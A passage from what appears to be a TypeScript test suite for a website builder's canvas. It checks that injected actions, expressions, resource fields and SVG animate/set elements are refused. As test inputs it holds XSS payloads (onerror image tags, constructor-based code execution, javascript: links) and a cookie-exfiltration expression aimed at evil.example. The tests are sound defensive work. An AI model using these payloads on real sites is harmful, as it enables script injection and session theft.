    // a code that reaches the page through the event
    action("member", [
      {
        args: ["event"],
        code: 'event.target.innerHTML = "<img src=x onerror=window.pwned=4>"',
      },
    ]),
    // a code that names a parameter
    action("parameter", [{ args: [], code: `$ws$dataSource$param = "x"` }]),
    // a < followed later by a >
    action("generic", [
      { args: ["a", "b", "c"], code: "$ws$dataSource$clicked = a < b > (c)" },
    ]),
    // an event set to a variable, where a button passes one
    action("stored", [
      { args: ["event"], code: "$ws$dataSource$clicked = event" },
    ]),
    // a variable another element holds
    action("outside", [{ args: [], code: '$ws$dataSource$sibling = "x"' }]),
    // a data source with an empty id
    action("empty", [{ args: [], code: "$ws$dataSource$ = 1" }]),
    // a regular expression after a `>`
    action("regex", [{ args: [], code: "1 < 2 > /(globalThis.pwned = 5)/g" }]),
    // an arg named like a variable
    action("shadow", [
      { args: ["event"], code: "$ws$dataSource$clicked = $ws$dataSource$e" },
    ]),
    // a member, with no args
    action("length", [
      {
        args: [],
        code: "$ws$dataSource$clicked = $ws$dataSource$clicked.length",
      },
    ]),
    // an assignment to a Resource
    action("resource", [{ args: [], code: "$ws$dataSource$res = 1" }]),
    // a member, a < followed later by a > and a regular expression, where
    // the args may be named
    action(
      "form-member",
      [
        {
          args: ["state"],
          code: '$ws$dataSource$clicked = state.constructor.constructor("window.pwned = 6")()',
        },
      ],
      "onStateChange"
    ),
    action(
      "form-generic",
      [{ args: ["a", "b", "c"], code: "$ws$dataSource$clicked = a < b > (c)" }],
      "onStateChange"
    ),
    action(
      "form-regex",
      [
        {
          args: ["state"],
          code: "$ws$dataSource$clicked = $ws$dataSource$clicked < $ws$dataSource$clicked > /(globalThis.pwned = state)/i",
        },
      ],
      "onStateChange"
    ),
    // a < followed later by a >, with no args and where the args may be named
    action("newline", [
      {
        args: [],
        code: '$ws$dataSource$clicked = "s" < 1 >\n ["constructor"] < 1 >\n ["constructor"]',
      },
    ]),
    action("newline-block", [
      {
        args: [],
        code: '$ws$dataSource$clicked = 1 < 2 >\n{} / "/}, globalThis.pwned = 7, () => { // "',
      },
    ]),
    ...(
      [
        ["newline-cr", "\r"],
        ["newline-ls", "\u2028"],
        ["newline-comment", " /*\n*/ "],
      ] as const
    ).map(([id, between]) =>
      action(id, [
        {
          args: [],
          code: `$ws$dataSource$clicked = 1 < 2 >${between}{} / "/}, globalThis.pwned = 8, () => { // "`,
        },
      ])
    ),
    action(
      "form-newline",
      [
        {
          args: ["state"],
          code: '$ws$dataSource$clicked = state < 1 >\n["constructor"]',
        },
      ],
      "onStateChange"
    ),
    action(
      "form-a",
      [
        {
          args: ["a"],
          code: '$ws$dataSource$clicked = a < 1 >\n["constructor"]',
        },
      ],
      "onStateChange"
    ),
    // an object keyed __proto__
    action("proto", [
      { args: [], code: "$ws$dataSource$clicked = { __proto__: null }" },
    ]),
    // a comment
    action("comment", [
      { args: [], code: '$ws$dataSource$clicked = /* note */ "x"' },
    ]),
    // a variable whose id the page module uses for something else
    action("conflict", [
      { args: [], code: "$ws$dataSource$clicked = $ws$dataSource$set$x" },
    ]),
    action("taken", [
      { args: [], code: "$ws$dataSource$clicked = $ws$dataSource$taken" },
    ]),
    // an arg a variable it reads could be named as
    action(
      "form-named",
      [
        {
          args: ["clicked"],
          code: "$ws$dataSource$clicked = $ws$dataSource$clicked || clicked",
        },
      ],
      "onStateChange"
    ),
    // what a template writes
    action("kept", [{ args: [], code: `$ws$dataSource$clicked = "yes"` }]),
  ];

  const propOf = (instanceId: string, name = "onClick") =>
    $propValuesByInstanceSelector
      .get()
      .get(getInstanceKey([instanceId, "body"]))
      ?.get(name);
  const onClickOf = (instanceId: string) => propOf(instanceId);

  beforeEach(() => {
    (window as { pwned?: number }).pwned = undefined;
    $dataSources.set(
      new Map([
        [
          "clicked",
          {
            type: "variable",
            id: "clicked",
            name: "clicked",
            scopeInstanceId: "body",
            value: { type: "string", value: "no" },
          },
        ],
        [
          "param",
          {
            type: "parameter",
            id: "param",
            name: "name",
            scopeInstanceId: "body",
          },
        ],
        [
          "sibling",
          {
            type: "variable",
            id: "sibling",
            name: "sibling",
            scopeInstanceId: "elsewhere",
            value: { type: "string", value: "" },
          },
        ],
        [
          "",
          {
            type: "variable",
            id: "",
            name: "empty",
            scopeInstanceId: "body",
            value: { type: "string", value: "" },
          },
        ],
        // a variable named like an arg
        [
          "e",
          {
            type: "variable",
            id: "e",
            name: "event",
            scopeInstanceId: "body",
            value: { type: "string", value: "idle" },
          },
        ],
        [
          "res",
          {
            type: "resource",
            id: "res",
            name: "res",
            scopeInstanceId: "body",
            resourceId: "res-resource",
          },
        ],
        // ids the page module uses for something else
        [
          "set$x",
          {
            type: "variable",
            id: "set$x",
            name: "x",
            scopeInstanceId: "body",
            value: { type: "string", value: "" },
          },
        ],
        [
          "taken",
          {
            type: "variable",
            id: "taken",
            name: "taken",
            scopeInstanceId: "body",
            value: { type: "string", value: "" },
          },
        ],
      ])
    );
    $resources.set(
      new Map([
        [
          "taken",
          {
            id: "taken",
            name: "taken",
            method: "get",
            url: '"https://example.org"',
            headers: [],
          },
        ],
      ])
    );
    $dataSourceVariables.set(new Map());
  });

  afterEach(() => {
    cleanStores($propValuesByInstanceSelector);
  });

  test("runs none of the refused actions, and gives them no handler that does anything", async () => {
    await settled(() => {
      prepare({ instances, props });
    });

    const handlers = [
      ...refused.map((id) => [id, onClickOf(id)]),
      ...refusedOnForm.map((id) => [id, propOf(id, "onStateChange")]),
    ];
    const actions = new Map(props);
    const dataSourceIds = new Set([
      SYSTEM_VARIABLE_ID,
      ...$dataSources.get().keys(),
    ]);
    for (const [id, handler] of handlers) {
      const action = [...actions.values()].find(
        (prop) => prop.instanceId === id && prop.type === "action"
      );
      // one that input validation passes gets no function
      if (
        action?.type === "action" &&
        checkAction(action.value, { dataSourceIds }).ok
      ) {
        expect(handler, String(id)).toBeUndefined();
      }
      if (handler !== undefined) {
        expect(typeof handler, String(id)).toBe("function");
        (handler as (event: unknown) => void)({
          view: window,
          target: document.body,
        });
      }
    }
    expect(pwned()).toBeUndefined();
    expect($dataSourceVariables.get().size).toBe(0);
  });

  test("gives an action that may run a working handler", async () => {
    await settled(() => {
      prepare({ instances, props });
    });

    const onClick = onClickOf("kept");
    expect(typeof onClick).toBe("function");
    (onClick as (event: unknown) => void)({});
    expect($dataSourceVariables.get().get("clicked")).toBe("yes");
  });

  // The templates' action sets a variable to its arg, and still does when an
  // org has named the variable as the arg
  test("gives the templates' action a working handler when the variable it sets is named as its arg", async () => {
    await settled(() => {
      prepare({
        instances,
        props: [
          action(
            "signup",
            [{ args: ["clicked"], code: "$ws$dataSource$clicked = clicked" }],
            "onStateChange"
          ),
        ],
      });
    });

    const onStateChange = propOf("signup", "onStateChange");
    expect(typeof onStateChange).toBe("function");
    (onStateChange as (state: string) => void)("success");
    expect($dataSourceVariables.get().get("clicked")).toBe("success");
  });

  // 0.309.0's forms pass their action plain data: a Resource Form its
  // state, progress and result, and a Webhook Form its state
  test("gives a Resource Form's and a Webhook Form's actions a working handler", async () => {
    const setClicked = (instanceId: string, name: string) =>
      action(
        instanceId,
        [{ args: ["value"], code: "$ws$dataSource$clicked = value" }],
        name
      );
    await settled(() =>
      prepare({
        instances: [
          instance({ id: "body", children: ids("resource", "webhook") }),
          instance({ id: "resource", component: "ResourceForm" }),
          instance({ id: "webhook", component: "WebhookForm" }),
        ],
        props: [
          setClicked("resource", "onStateChange"),
          setClicked("resource", "onProgressChange"),
          setClicked("resource", "onResultChange"),
          setClicked("webhook", "onStateChange"),
          // a Webhook Form has no progress to pass
          setClicked("webhook", "onProgressChange"),
        ],
      })
    );

    for (const [instanceId, name, value] of [
      ["resource", "onStateChange", "success"],
      ["resource", "onProgressChange", { status: "pending", files: [] }],
      ["resource", "onResultChange", { success: true, errors: [] }],
      ["webhook", "onStateChange", "error"],
    ] as const) {
      const handler = propOf(instanceId, name);
      expect(typeof handler, `${instanceId} ${name}`).toBe("function");
      (handler as (value: unknown) => void)(value);
      expect($dataSourceVariables.get().get("clicked")).toEqual(value);
    }
    expect(propOf("webhook", "onProgressChange")).toBeUndefined();
  });

  // A page's own data source is a parameter, so a variable with its id is
  // one the page module cannot name as itself
  test("gives no handler to an action that names a variable with a page's own id", async () => {
    const handler = async (systemDataSourceId: undefined | string) => {
      await settled(() => {
        prepare({
          instances,
          props: [
            action("kept", [
              {
                args: [],
                code: "$ws$dataSource$clicked = $ws$dataSource$pagesystem",
              },
            ]),
          ],
        });
        $pages.set(
          createDefaultPages({
            homePageId: "home",
            rootInstanceId: "body",
            systemDataSourceId,
          })
        );
      });
      return onClickOf("kept");
    };
    $dataSources.set(
      new Map([
        ...$dataSources.get(),
        [
          "pagesystem",
          {
            type: "variable",
            id: "pagesystem",
            name: "pagesystem",
            scopeInstanceId: "body",
            value: { type: "string", value: "" },
          },
        ],
      ])
    );
    expect(await handler("pagesystem")).toBeUndefined();
    expect(typeof (await handler(undefined))).toBe("function");
  });

  // A Collection binds as its item only a parameter of its own: an action
  // inside it that names a variable the Collection binds is refused, as
  // publishing refuses it
  test("gives no handler to an action that names a variable a Collection binds", async () => {
    const collection = async (item: string) => {
      await settled(() => {
        prepare({
          instances: [
            instance({ id: "body", children: ids("list") }),
            instance({
              id: "list",
              component: "ws:collection",
              children: ids("card"),
            }),
            instance({ id: "card", tag: "button" }),
          ],
          props: [
            [
              "list:data",
              {
                id: "list:data",
                instanceId: "list",
                name: "data",
                type: "json",
                value: ["A", "B"],
              },
            ],
            [
              "list:item",
              {
                id: "list:item",
                instanceId: "list",
                name: "item",
                type: "parameter",
                value: item,
              },
            ],
            action("card", [
              {
                args: [],
                code: "$ws$dataSource$clicked = $ws$dataSource$sibling",
              },
            ]),
          ],
        });
      });
      return $propValuesByInstanceSelector
        .get()
        .get(getInstanceKey(["card", "list[0]", "list", "body"]))
        ?.get("onClick");
    };
    const sibling = {
      type: "variable" as const,
      id: "sibling",
      name: "sibling",
      scopeInstanceId: "body",
      value: { type: "string" as const, value: "" },
    };
    $dataSources.set(new Map([...$dataSources.get(), ["sibling", sibling]]));
    expect(await collection("sibling")).toBeUndefined();
    // a parameter of the Collection's own as its item
    $dataSources.set(
      new Map([
        ...$dataSources.get(),
        [
          "item",
          {
            type: "parameter",
            id: "item",
            name: "item",
            scopeInstanceId: "list",
          },
        ],
      ])
    );
    expect(typeof (await collection("item"))).toBe("function");
  });

  // A page template is edited on the canvas as a page is, so its Rotating
  // Tabs keep their action there
  test("gives a page template's action its handler while the template is edited", async () => {
    await settled(() => {
      prepare({
        instances: [
          instance({ id: "body" }),
          instance({
            id: "template-body",
            component: "Body",
            children: ids("rotation"),
          }),
          instance({
            id: "rotation",
            component: "@organizeos/site-components:RotationControl",
          }),
        ],
        props: [
          action(
            "rotation",
            [{ args: ["value"], code: "$ws$dataSource$tab = value" }],
            "onValueChange"
          ),
        ],
      });
      const pages = $pages.get();
      if (pages === undefined) {
        throw Error("no pages");
      }
      $pages.set({
        ...pages,
        pageTemplates: new Map([
          [
            "template",
            {
              id: "template",
              name: "Template",
              title: `"Template"`,
              rootInstanceId: "template-body",
              meta: {},
            },
          ],
        ]),
      });
      $selectedPageId.set("template");
      $dataSources.set(
        new Map([
          [
            "tab",
            {
              type: "variable",
              id: "tab",
              name: "tab",
              scopeInstanceId: "template-body",
              value: { type: "string", value: "0" },
            },
          ],
        ])
      );
    });
    const onValueChange = $propValuesByInstanceSelector
      .get()
      .get(getInstanceKey(["rotation", "template-body"]))
      ?.get("onValueChange");
    expect(typeof onValueChange).toBe("function");
    (onValueChange as (value: string) => void)("1");
    expect($dataSourceVariables.get().get("tab")).toBe("1");
    $selectedPageId.set("home");
  });

  // Publishing reads the pages, so an instance a page reaches is judged by
  // the pages, even while a page template that also holds it is edited
  test("judges an action a page reaches by the pages, as publishing does", async () => {
    const onValueChange = () =>
      $propValuesByInstanceSelector
        .get()
        .get(getInstanceKey(["shared", "wrapper", "template-body"]))
        ?.get("onValueChange");
    await settled(() => {
      prepare({
        instances: [
          instance({ id: "body", children: ids("shared") }),
          instance({
            id: "template-body",
            component: "Body",
            children: ids("wrapper"),
          }),
          instance({
            id: "wrapper",
            component: "Box",
            children: ids("shared"),
          }),
          instance({
            id: "shared",
            component: "@organizeos/site-components:RotationControl",
          }),
        ],
        props: [
          action(
            "shared",
            [{ args: ["value"], code: "$ws$dataSource$tab = value" }],
            "onValueChange"
          ),
        ],
      });
      const pages = $pages.get();
      if (pages === undefined) {
        throw Error("no pages");
      }
      $pages.set({
        ...pages,
        pageTemplates: new Map([
          [
            "template",
            {
              id: "template",
              name: "Template",
              title: `"Template"`,
              rootInstanceId: "template-body",
              meta: {},
            },
          ],
        ]),
      });
      $selectedPageId.set("template");
      // a variable of the template's: not one the page declares
      $dataSources.set(
        new Map([
          [
            "tab",
            {
              type: "variable",
              id: "tab",
              name: "tab",
              scopeInstanceId: "wrapper",
              value: { type: "string", value: "0" },
            },
          ],
        ])
      );
    });
    expect(onValueChange()).toBeUndefined();
    await settled(() => {
      // the page's own
      $dataSources.set(
        new Map([
          [
            "tab",
            {
              type: "variable",
              id: "tab",
              name: "tab",
              scopeInstanceId: "body",
              value: { type: "string", value: "0" },
            },
          ],
        ])
      );
    });
    expect(typeof onValueChange()).toBe("function");
    $selectedPageId.set("home");
  });

  // While org script is paused a variable holds only plain data, whatever an
  // action that may run is called with
  test("stores what is not plain data as undefined, and plain data as it is", async () => {
    await settled(() => {
      prepare({
        instances,
        props: [
          [
            "signup:onStateChange",
            {
              id: "signup:onStateChange",
              instanceId: "signup",
              name: "onStateChange",
              type: "action",
              value: [
                {
                  type: "execute",
                  args: ["state"],
                  code: "$ws$dataSource$clicked = state",
                },
              ],
            },
          ],
        ],
      });
    });
    const onStateChange = $propValuesByInstanceSelector
      .get()
      .get(getInstanceKey(["signup", "body"]))
      ?.get("onStateChange") as (state: unknown) => void;
    expect(typeof onStateChange).toBe("function");
    const stored = (value: unknown) => {
      onStateChange(value);
      return $dataSourceVariables.get().get("clicked");
    };

    expect(stored(new Event("click"))).toBeUndefined();
    expect(stored(window)).toBeUndefined();
    expect(stored(document.body)).toBeUndefined();
    expect(stored("success")).toBe("success");
    expect(stored(3)).toBe(3);
    expect(stored(Infinity)).toBe(Infinity);
    expect(stored(-Infinity)).toBe(-Infinity);
    expect(stored(NaN)).toBeNaN();
    expect(stored({ a: [1, "b"], c: null })).toEqual({ a: [1, "b"], c: null });
    expect(stored({ a: { view: window } })).toBeUndefined();
  });

  test.each(renderers)(
    "the %s renders the elements without running them, before and after a click",
    async (renderer) => {
      const dom = await render({ renderer, instances, props });

      expect(pwned()).toBeUndefined();
      for (const id of [...refused, "kept"]) {
        expect(dom.querySelector(`[data-ws-id="${id}"]`), id).not.toBeNull();
      }

      act(() => {
        for (const id of refused) {
          dom.querySelector<HTMLElement>(`[data-ws-id="${id}"]`)?.click();
        }
      });
      expect(pwned()).toBeUndefined();
      expect(dom.querySelector('[data-ws-id="member"]')?.innerHTML).toBe("");
      expect($dataSourceVariables.get().has("param")).toBe(false);
    }
  );
});

// The builder's global root is not an instance it stores: publishing leaves a
// stored one out, and the canvas does not render it
describe.each(renderers)(
  "the %s renders an instance stored with the global root's id",
  (renderer) => {
    test("not at all, nor anything inside it", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids(":root", "kept") }),
          instance({ id: ":root", tag: "div", children: ids("inside") }),
          instance({ id: "inside", tag: "div" }),
          instance({ id: "kept", tag: "div" }),
        ],
        props: [],
      });

      expect(dom.querySelector('[data-ws-id=":root"]')).toBeNull();
      expect(dom.querySelector('[data-ws-id="inside"]')).toBeNull();
      expect(dom.querySelector('[data-ws-id="kept"]')).not.toBeNull();
    });
  }
);

// While org script is paused a variable holds plain data only, so no prop
// named `ref` reaches a component (withoutPausedProps)
describe.each(renderers)("the %s passes no ref prop", (renderer) => {
  test("from an expression or a parameter that names a variable", async () => {
    const held = { current: "plain" };
    $dataSources.set(
      new Map<string, DataSource>([
        [
          "held",
          {
            type: "variable",
            id: "held",
            name: "held",
            scopeInstanceId: "body",
            value: { type: "json", value: held },
          },
        ],
      ])
    );
    $dataSourceVariables.set(new Map());
    const dom = await render({
      renderer,
      instances: [
        instance({ id: "body", children: ids("bound", "named") }),
        instance({ id: "bound", tag: "div" }),
        instance({ id: "named", tag: "div" }),
      ],
      props: [
        [
          "bound-ref",
          {
            id: "bound-ref",
            instanceId: "bound",
            name: "ref",
            type: "expression",
            value: encodeDataSourceVariable("held"),
          },
        ],
        [
          "named-ref",
          {
            id: "named-ref",
            instanceId: "named",
            name: "ref",
            type: "parameter",
            value: "held",
          },
        ],
      ],
    });

    expect(dom.querySelector('[data-ws-id="bound"]')).not.toBeNull();
    expect(held.current).toBe("plain");
    for (const value of $dataSourceVariables.get().values()) {
      expect(value instanceof Element).toBe(false);
    }
    $dataSources.set(new Map());
  });
});

// While org script is paused the canvas compiles an expression only when
// expressionMayRun passes it, and computes no function from one
// (getCompiledExpression and evaluateExpressionSync in
// packages/project-build/src/runtime/data.ts, docs/ORGANIZEOS-FORK.md
// section 10). A refused expression has no value, as
// on the published page.
describe("the canvas computes an expression", () => {
  const pwned = () => (window as { pwned?: number }).pwned;
  const text = encodeDataSourceVariable("text");
  const events = encodeDataSourceVariable("events");
  const event = encodeDataSourceVariable("event");
  const refusedCode = "0) || (globalThis.pwned = 1";
  // a draft that is not one whole expression
  const savedCode = 'false) || ("y"';

  const bound = (
    instanceId: string,
    name: string,
    value: string
  ): [string, Prop] => {
    const id = `${instanceId}:${name}`;
    return [id, { id, instanceId, name, type: "expression", value }];
  };
  const parameter = (
    instanceId: string,
    name: string,
    value: string
  ): [string, Prop] => {
    const id = `${instanceId}:${name}`;
    return [id, { id, instanceId, name, type: "parameter", value }];
  };

  const instances = [
    instance({
      id: "body",
      children: ids(
        "title",
        "text",
        "shown",
        "list",
        "saved",
        "handler",
        "cards"
      ),
    }),
    instance({ id: "title" }),
    instance({
      id: "text",
      tag: "p",
      children: [{ type: "expression", value: refusedCode }],
    }),
    instance({ id: "shown" }),
    instance({
      id: "list",
      component: collectionComponent,
      children: ids("listItem"),
    }),
    instance({ id: "listItem" }),
    instance({ id: "saved" }),
    instance({ id: "handler", tag: "button" }),
    // an Event List's collection and a card that reads its item
    instance({
      id: "cards",
      component: collectionComponent,
      children: ids("card"),
    }),
    instance({
      id: "card",
      tag: "h3",
      children: [{ type: "expression", value: `${event}.title` }],
    }),
  ];

  const props = [
    bound("title", "title", refusedCode),
    bound("shown", "data-ws-show", refusedCode),
    bound("list", "data", refusedCode),
    parameter("list", "item", "item"),
    bound("saved", "title", savedCode),
    // a method read as a value
    bound("handler", "onClick", `${text}.slice`),
    bound(
      "cards",
      "data",
      `(${events}.ok === true ? ${events}.data.data : [])`
    ),
    parameter("cards", "item", "event"),
  ];

  const valuesOf = (...instanceSelector: string[]) =>
    $propValuesByInstanceSelector
      .get()
      .get(getInstanceKey([...instanceSelector, "body"]));

  beforeEach(() => {
    (window as { pwned?: number }).pwned = undefined;
    $dataSources.set(
      new Map<string, DataSource>([
        [
          "text",
          {
            type: "variable",
            id: "text",
            name: "text",
            scopeInstanceId: "body",
            value: { type: "string", value: "abc" },
          },
        ],
        [
          "events",
          {
            type: "variable",
            id: "events",
            name: "events",
            scopeInstanceId: "body",
            value: {
              type: "json",
              value: { ok: true, data: { data: [{ title: "Rally" }] } },
            },
          },
        ],
        [
          "item",
          {
            type: "parameter",
            id: "item",
            name: "item",
            scopeInstanceId: "list",
          },
        ],
        [
          "event",
          {
            type: "parameter",
            id: "event",
            name: "event",
            scopeInstanceId: "cards",
          },
        ],
      ])
    );
    $dataSourceVariables.set(new Map());
  });

  afterEach(() => {
    cleanStores($propValuesByInstanceSelector);
  });

  test("runs none of the refused expressions, and gives them no value", async () => {
    await settled(() => {
      prepare({ instances, props });
    });

    expect(pwned()).toBeUndefined();
    expect(valuesOf("title")?.has("title")).toBe(false);
    expect(valuesOf("text")?.has(textContentAttribute)).toBe(false);
    expect(valuesOf("shown")?.has("data-ws-show")).toBe(false);
    expect(valuesOf("saved")?.has("title")).toBe(false);
    // a Collection with no data renders nothing
    expect(valuesOf("list")?.has("data")).toBe(false);
    expect(
      [...$propValuesByInstanceSelector.get().keys()].some((key) =>
        key.includes("listItem")
      )
    ).toBe(false);
  });

  // One complete expression the linter accepts may still read a member it may
  // not read
  const lintClean = '"x".constructor.name';

  test("runs no complete expression the linter accepts that may not run, and gives it no value", async () => {
    expect(lintExpression({ expression: lintClean })).toEqual([]);
    await settled(() =>
      prepare({
        instances: [
          instance({ id: "body", children: ids("title", "text", "shown") }),
          instance({ id: "title" }),
          instance({
            id: "text",
            tag: "p",
            children: [{ type: "expression", value: lintClean }],
          }),
          instance({ id: "shown" }),
        ],
        props: [
          bound("title", "title", lintClean),
          bound("title", "data-member", `${text}.constructor.name`),
          // no comment, inside an expression either
          bound("title", "data-comment", `${text} /* x */ .length`),
          // input validation passes these: the pause's rule refuses them
          bound("title", "data-call", `${text}.slice(${text})`),
          bound("title", "data-key", "({ toString: 1 })"),
          bound("shown", "data-ws-show", lintClean),
        ],
      })
    );

    expect(valuesOf("title")?.has("title")).toBe(false);
    expect(valuesOf("title")?.has("data-member")).toBe(false);
    expect(valuesOf("title")?.has("data-comment")).toBe(false);
    expect(valuesOf("title")?.has("data-call")).toBe(false);
    expect(valuesOf("title")?.has("data-key")).toBe(false);
    expect(valuesOf("text")?.has(textContentAttribute)).toBe(false);
    expect(valuesOf("shown")?.has("data-ws-show")).toBe(false);
  });

  // Input validation (code-check.ts) is the outer layer, and what either
  // refuses has no value on the canvas (which reason the evaluator gives is
  // in project-build's data.organizeos.test.ts)
  test("gives what input validation refuses no value, as what the pause's rule refuses", async () => {
    await settled(() =>
      prepare({
        instances: [
          instance({ id: "body", children: ids("title") }),
          instance({ id: "title" }),
        ],
        props: [
          bound("title", "title", '({constructor: "order"})'),
          bound("title", "data-angle", "0 < 1 > 2"),
        ],
      })
    );

    expect(valuesOf("title")?.has("title")).toBe(false);
    expect(valuesOf("title")?.has("data-angle")).toBe(false);
  });

  // A link's address holds no object whose keys the rule refuses
  test("gives a link no address from an object with a key the rule refuses", async () => {
    const stateful =
      '({toString: [].shift, length: 2, 0: "https://ok.example/", 1: "javascript:void 0"})';
    await settled(() =>
      prepare({
        instances: [
          instance({ id: "body", children: ids("link") }),
          instance({ id: "link", tag: "a" }),
        ],
        props: [bound("link", "href", stateful)],
      })
    );

    expect(valuesOf("link")?.has("href")).toBe(false);
  });

  test("requests a Resource without a field the linter accepts that may not run", async () => {
    const request = await computeResourceRequest(
      {
        id: "resource",
        name: "resource",
        method: "get",
        url: lintClean,
        headers: [{ name: "x", value: lintClean }],
      },
      new Map()
    );

    expect(request.url).toBeUndefined();
    expect(request.headers).toEqual([{ name: "x", value: undefined }]);
  });

  test("computes no function", async () => {
    await settled(() => {
      prepare({ instances, props });
    });

    expect(valuesOf("handler")?.has("onClick")).toBe(false);
  });

  test("computes an Event List's bind and a Collection's item as before", async () => {
    await settled(() => {
      prepare({ instances, props });
    });

    expect(valuesOf("cards")?.get("data")).toEqual([{ title: "Rally" }]);
    expect(
      [...$propValuesByInstanceSelector.get().values()].map((values) =>
        values.get(textContentAttribute)
      )
    ).toContain("Rally");
  });

  test("requests a Resource without a field that may not run", async () => {
    const request = await computeResourceRequest(
      {
        id: "resource",
        name: "resource",
        method: "post",
        url: refusedCode,
        searchParams: [{ name: "q", value: refusedCode }],
        headers: [
          { name: "x", value: refusedCode },
          { name: "y", value: '"kept"' },
        ],
        body: refusedCode,
      },
      new Map()
    );

    expect(pwned()).toBeUndefined();
    expect(request.url).toBeUndefined();
    expect(request.searchParams).toEqual([{ name: "q", value: undefined }]);
    expect(request.headers).toEqual([
      { name: "x", value: undefined },
      { name: "y", value: "kept" },
    ]);
    expect(request.body).toBeUndefined();
  });

  // While org script is paused an action names its args only where its
  // component passes plain data, so no event reaches a variable, and an
  // expression that reads a host object through one reads nothing
  // (docs/ORGANIZEOS-FORK.md section 10, Actions)
  test.each(renderers)(
    "an action that stores its event stores no host object, so an expression that reads one reads nothing, in the %s",
    async (renderer) => {
      const stored = encodeDataSourceVariable("stored");
      document.cookie = "session=SECRET";
      $dataSources.set(
        new Map<string, DataSource>([
          [
            "stored",
            {
              type: "variable",
              id: "stored",
              name: "stored",
              scopeInstanceId: "body",
              value: { type: "string", value: "" },
            },
          ],
        ])
      );
      const instances = [
        instance({ id: "body", children: ids("button", "image") }),
        instance({ id: "button", tag: "button" }),
        instance({ id: "image", tag: "img" }),
      ];
      const props: Array<[string, Prop]> = [
        [
          "button:onClick",
          {
            id: "button:onClick",
            instanceId: "button",
            name: "onClick",
            type: "action",
            value: [
              { type: "execute", args: ["event"], code: `${stored} = event` },
            ],
          },
        ],
        bound(
          "image",
          "src",
          `"https://evil.example/c?" + ${stored}.view.document.cookie`
        ),
      ];

      // a button passes its action an event, so the action may not name it
      await settled(() => {
        prepare({ instances, props });
      });
      expect(valuesOf("button")?.get("onClick")).toBeUndefined();

      const dom = await render({ renderer, instances, props });
      act(() => {
        dom.querySelector<HTMLElement>('[data-ws-id="button"]')?.click();
      });
      const storedValue = $dataSourceVariables.get().get("stored");
      expect(
        storedValue === window ||
          (storedValue as { view?: unknown } | undefined)?.view === window
      ).toBe(false);
      // the expression is computed, and reads nothing
      const src =
        dom.querySelector('[data-ws-id="image"]')?.getAttribute("src") ?? "";
      expect(src).toMatch(/^https:\/\/evil\.example\/c\?/);
      expect(src).not.toContain("SECRET");
    }
  );
});

// Inside a link, an SVG animate or set sets the link's href by SMIL, past the
// address check, and a click in preview runs it. The canvas makes neither,
// whichever way the tag reaches an element (elementTagMayRender,
// docs/ORGANIZEOS-FORK.md section 10), as publishing drops both.
// animateTransform and animateMotion cannot set an href, and stay.
describe.each(renderers)("the %s renders no SVG animate or set", (renderer) => {
  const pwn = "javascript:window.pwned = 1";

  const smilElements = (dom: Element) =>
    Array.from(dom.querySelectorAll("*")).filter(
      (element) =>
        element.localName === "animate" || element.localName === "set"
    );

  test("without an animate or set on a ws:element in an SVG link, and with animateTransform and animateMotion", async () => {
    const dom = await render({
      renderer,
      instances: [
        instance({ id: "body", children: ids("svg") }),
        instance({ id: "svg", tag: "svg", children: ids("link") }),
        instance({
          id: "link",
          tag: "a",
          children: ids("animate", "set", "transform", "motion"),
        }),
        instance({ id: "animate", tag: "animate" }),
        instance({ id: "set", tag: "set" }),
        instance({ id: "transform", tag: "animateTransform" }),
        instance({ id: "motion", tag: "animateMotion" }),
      ],
      props: [
        prop("animate", "attributeName", "string", "href"),
        prop("animate", "values", "string", pwn),
        prop("set", "attributeName", "string", "href"),
        prop("set", "to", "string", pwn),
        prop("transform", "attributeName", "string", "transform"),
        prop("transform", "type", "string", "rotate"),
        prop("motion", "path", "string", "M0,0 L10,10"),
      ],
    });

    expect(smilElements(dom)).toEqual([]);
    // each is still there, as a div that nothing animates
    expect(dom.querySelector("[data-ws-id=animate]")?.localName).toBe("div");
    expect(dom.querySelector("[data-ws-id=set]")?.localName).toBe("div");
    expect(dom.querySelector("[data-ws-id=transform]")?.localName).toBe(
      "animateTransform"
    );
    expect(dom.querySelector("[data-ws-id=motion]")?.localName).toBe(
      "animateMotion"
    );
  });

  // each falls back to its own default element
  test("without an animate or set on a Box, Text, Heading or Dialog Title given one as its tag", async () => {
    const dom = await render({
      renderer,
      instances: [
        instance({
          id: "body",
          children: ids("box", "text", "heading", "dialog"),
        }),
        instance({ id: "box", component: "Box", tag: "animate" }),
        instance({ id: "text", component: "Text" }),
        instance({ id: "heading", component: "Heading" }),
        instance({
          id: "dialog",
          component: `${radixNamespace}:Dialog`,
          children: ids("title"),
        }),
        instance({ id: "title", component: `${radixNamespace}:DialogTitle` }),
      ],
      props: [
        prop("text", "data-ws-tag", "string", "set"),
        prop("heading", "tag", "expression", '"anim" + "ate"'),
        prop("dialog", "open", "boolean", true),
        prop("title", "tag", "string", "set"),
      ],
    });

    expect(smilElements(document.body)).toEqual([]);
    expect(dom.querySelector("[data-ws-id=box]")?.tagName).toBe("DIV");
    expect(dom.querySelector("[data-ws-id=text]")?.tagName).toBe("DIV");
    expect(dom.querySelector("[data-ws-id=heading]")?.tagName).toBe("H1");
    expect(document.querySelector("[data-ws-id=title]")).not.toBeNull();
  });

  test("without an animate a Radix trigger passes down to a Box", async () => {
    await render({
      renderer,
      instances: forwarderTree("PopoverTrigger", ["Popover"], "Box"),
      props: [
        prop("trigger", "data-ws-tag", "string", "animate"),
        prop("trigger", "attributeName", "string", "href"),
        prop("trigger", "values", "string", pwn),
      ],
    });

    expect(smilElements(document.body)).toEqual([]);
    expect(document.querySelector("[data-ws-id=child]")?.tagName).toBe("DIV");
  });

  test("without a set a parent passes in", async () => {
    const box: Instance = {
      type: "instance",
      id: "box",
      component: "Box",
      children: [],
    };
    prepare({ instances: [["box", box]], props: [] });
    const Component = componentOf(renderer);
    const passedIn: Record<string, unknown> = {
      "data-ws-tag": "set",
      attributeName: "href",
      to: pwn,
    };

    const dom = await mount(
      renderer,
      <Component
        instance={box}
        instanceSelector={["box"]}
        components={$registeredComponents.get()}
        {...passedIn}
      />
    );

    expect(smilElements(dom)).toEqual([]);
    expect(dom.querySelector("[data-ws-id=box]")?.tagName).toBe("DIV");
  });
});

// A Content Block bound to an MDX document renders the document's instances in
// place of its own: the outer renderer substitutes the occurrence instance
// (an external content root) before the inner renderer, which holds the
// checks, sees it. So what an MDX document holds passes the same checks. The
// canvas substitutes in Content mode only; the preview always does.
describe.each(renderers)(
  "the %s renders an MDX occurrence through the checks",
  (renderer) => {
    afterEach(() => {
      $builderMode.set("design");
      $externalContentRoots.set(new Map());
